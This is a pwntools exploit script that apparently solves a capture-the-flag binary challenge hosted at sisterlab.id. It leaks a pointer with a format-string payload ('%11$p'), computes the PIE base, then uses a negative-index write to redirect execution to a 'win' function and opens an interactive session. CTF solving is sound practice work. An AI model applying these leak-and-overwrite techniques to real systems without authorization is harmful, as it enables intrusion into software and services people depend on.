from pwn import *

# ===========================================================
#                       CONFIG SETUP
# ===========================================================
def initIO(argv=[]):
    if (args.LOCAL):
        if (args.GDB):
            return gdb.debug(argv or [elf.path], gdbscript=script)
        return elf.process()

    host = conn.split(' ')[0]
    port = int(conn.split(' ')[1])

    return remote(host, port)
        
if (args.DEBUG):
    context.log_level = "debug"

context.terminal = [
    'kitty', '@', 'launch',
    '--type', 'window',
    '--location', 'vsplit',
    'sh', '-c'
]

elf = "./client_patched"
if (elf != ""):
    elf = context.binary = ELF(elf)

libc = ""
if (libc != ""):
    libc = ELF(libc, checksec=False)
if (args.LOCAL):
    libc = elf.libc

script = """
    b* main+463
    b* write+129
    b* write+303
    # b* read+186
    c
    c
    c
"""

conn = "sisterlab.id 42006"
io = initIO()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io.sendlineafter(b': ', b'1')
io.sendlineafter(b': ', b'0')
io.sendlineafter(b': ', str(0xabcdef).encode())
io.sendlineafter(b': ', b'%11$p')

io.sendlineafter(b': ', b'2')
io.sendlineafter(b': ', b'0')

io.recvuntil(b'note: ')
leak = eval(io.recvline(False))

elf.address = leak - (elf.sym['main'] + 0x17f)

address = elf.sym['win'] & 0xFFFFFFFF

print(f'replace to: {address} ({hex(address)})')

io.sendlineafter(b': ', b'1')
io.sendlineafter(b': ', b'-6')
io.sendlineafter(b': ', str(address).encode())
io.sendlineafter(b': ', b'amongus')

io.sendlineafter(b': ', b'3')


# ===========================================================
#                       INTERACTIVE
# ===========================================================

io.interactive()
